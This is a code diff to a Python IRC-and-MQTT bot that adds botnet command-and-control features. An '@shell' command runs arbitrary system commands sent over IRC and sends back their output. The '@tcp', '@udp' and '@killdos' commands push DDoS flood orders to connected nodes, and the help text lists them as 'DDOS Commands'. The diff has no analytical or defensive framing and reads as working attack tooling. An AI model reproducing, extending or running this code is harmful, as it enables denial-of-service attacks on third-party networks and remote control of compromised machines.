@@ -21,9 +21,9 @@ print("""
 import socket,string,time,re,binascii,base64,operator,json,argparse,sys
 import paho.mqtt.client as mqtt
 import paho.mqtt.publish as publish
-
+import shlex,subprocess
 # version of this bot
-bot_version = "1.5 Beta"
+bot_version = "1.4 Beta"
 # initialize some vars
 CHANNEL="";CHANNEL_="";NICK="";HOST=""
 PORT='';pong_once='';priv_user="";data = ''
@@ -324,8 +324,20 @@ def connect_mqtt():
     client.on_message = handle_message
     client.loop_start()
 
+#########
+def shell_cmd(cmd):
+    command_line = cmd
+    args = shlex.split(command_line)
+    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output=iter(p.stdout.readline, b'')
+    ret=''
+    for line in output:
+        #line=line.strip("\n")
+        ret = ret + str(line) + " "
+    return ret
 
-def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL):
+    
+def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL,shell_enabled):
     # Listen for incoming data
     global scount
     readbuffer=""
@@ -417,7 +429,6 @@ def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL):
                         ircsend(action,sender,"Access denied.")
                         break
                     scount+=1
-                    # fix for 'single quote' parsing
                     mrecv=rawbuffer.split(" :@cmd ")
                     final=mrecv[1]
                     final=final.strip("\r\n")
@@ -569,7 +580,84 @@ def listen_irc(irc_auth,chan_key,dispass,priv_user,CHANNEL):
                     if verbose:
                         print("Shutting down...")
                     quit_irc(sender)
-                
+                elif re.match(r'^:@shell.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not shell_enabled:
+                        ircsend(action,sender,"Shell is disabled. This incident has been logged.")
+                        break
+                    if verbose:
+                        print("Received shell command: %s from sender: %s" % (final,sender))
+                    mrecv=rawbuffer.split(" :@shell ")
+                    final=mrecv[1]
+                    final=final.strip("\r")
+                    ret = shell_cmd(final)
+                    ret = ret.split("\n")
+                    for line in ret:
+                        line=line.strip("\n")
+                        if line!=" ":
+                            ircsend(action,sender,line)
+                        
+                # ddos commands
+                elif re.match(r'^:@tcp.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if debug or verbose:
+                        print("Received tcp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -t %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        s.send("%s %s :Error publishing message\n" % (action,sender))
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@udp.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if debug or verbose:
+                        print("Received udp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -u %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        ircsend(action,sender,"Error publishing message")
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@killdos.*$', line[3]):
+                    if not enabled:
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    if not bot_whitelist(sender, action):
+                        ircsend(action,sender,"Access denied.")
+                        break
+                    scount+=1
+                    if verbose or debug:
+                        print("Received a kill from %s, killing all attacks" % sender)
+                    ircsend(action,sender,"Killing all attacks")
+                    try:
+                        mqsend("dos -k >/dev/null 2>&1")
+                    except Exception as e:
+                        ircsend(action,sender,"Error publishing message")
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
                 else:
                     pass
 
@@ -593,6 +681,10 @@ def bot_usage(action, sender):
     ircsend(action,sender,"@register <password> <email> : Register bot with nickserv")
     ircsend(action,sender,"@join : <channel> : Join this channel")
     ircsend(action,sender,"@part : <channel> : Leave this channel")
+    ircsend(action,sender,"======== DDOS Commands ========")
+    ircsend(action,sender,"@tcp <ip> <port> <threads> <secs> : tcp ddos attack")
+    ircsend(action,sender,"@udp <ip> <port> <threads> <secs> : tcp udp attack")
+    ircsend(action,sender,"@killdos : Kill all running attacks")
     ircsend(action,sender,"======== ========= ========")
    
 
@@ -608,6 +700,7 @@ def getMergedConfig(filename):
     parser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='Produce verbose output')
     parser.add_option('-d','--debug', action='store_true', dest='debug', help='Print debug messages')
     parser.add_option('-V','--very_verbose', action='store_true', dest='very_verbose', help='Very Verbose mode: Print all raw output')
+    parser.add_option('-S','--shell_enabled', action='store_true', dest='shell_enabled', help='Enable system shell (potentially dangerous!)')
     parser.add_option('-b','--base64_on', action='store_true', dest='base64_on', help='Base64')
     parser.add_option('-N','--notice', action='store_true', dest='notice', help='Respond to notices')
 
@@ -632,12 +725,13 @@ def getMergedConfig(filename):
     cfglist.append(filecfg)
     return cfglist, args
 
-auth_users = ['anon', '#mqtt']
+auth_users = ['shellz', 'kek', '#mqtt']
 
 cfg, args = getMergedConfig('mqconfig.cfg')
 
 verbose=cfg.getByPath('verbose')
 very_verbose=cfg.getByPath('very_verbose')
+shell_enabled=cfg.getByPath('shell_enabled')
 notice=cfg.getByPath('notice')    
 base64_on=cfg.getByPath('base64_on')
 debug=cfg.getByPath('debug')
@@ -709,7 +803,7 @@ try:
         print("Connected to irc server...")
     connect_irc(irc_auth,KEY)
     connect_mqtt()
-    listen_irc(irc_auth,KEY,dispass,priv_user,CHANNEL)
+    listen_irc(irc_auth,KEY,dispass,priv_user,CHANNEL,shell_enabled)
 except KeyboardInterrupt:
     print("Caught signal, shutting down...")
     sys.exit(0)
